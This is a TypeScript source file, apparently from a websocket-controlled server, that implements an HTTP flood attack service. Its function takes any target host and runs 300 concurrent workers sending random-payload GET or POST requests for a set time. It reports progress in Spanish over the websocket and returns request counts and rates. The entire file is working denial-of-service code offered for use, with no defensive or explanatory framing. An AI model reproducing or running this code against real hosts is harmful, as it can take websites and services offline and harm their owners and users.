import {generateRandomString} from "../utils/generateRandomString.ts";
import {HttpClient} from "../utils/HttpClient.ts";
import type {WebSocket} from "@fastify/websocket";
export const HttpFloodService = {
    async httpFloodAttack(host: string, packetSize: number, time: number, ws: WebSocket){
        let requestExitosas = 0;
        let requestFallidas = 0;
        const client = new HttpClient();
        let url = host ;
        if(!host.startsWith("http://") && !host.startsWith("https://")){
            url = `https://${url}`
        }

        const isGet = packetSize > 64 ? false : Math.random() < 0.5
        const payload = generateRandomString(packetSize);
        const workers = 300;
        const startTime = Date.now();
        const sendAttack = async () =>{
         while ((Date.now() - startTime) / 1000 < time){
             try {
                 if(isGet){
                     await client.get(`${url}/${payload}`);
                 } else {
                     await client.post(url, payload);
                 }
                 ws.send(`Paquete de ${packetSize} bits enviado a ${url}`)
                 console.log(`Paquete de ${packetSize} bits enviado a ${url}`)
                 requestExitosas = requestExitosas +1;
             } catch (err){
                 ws.send(`Request fallida hacia ${url}`)
                 console.log(`Request fallida hacia ${url}`);
                 requestFallidas = requestFallidas +1
             }
         }
        }
        // @ts-ignore
        await Promise.all(Array(workers).fill().map(() => sendAttack()));
        return `Requests exitosas: ${requestExitosas.toLocaleString()} 
Requests fallidas: ${requestFallidas.toLocaleString()}
Requests totales: ${(requestExitosas + requestFallidas).toLocaleString()}
Requests por segundo: ${Math.floor((requestExitosas + requestFallidas) / time).toLocaleString()}`;
    }
}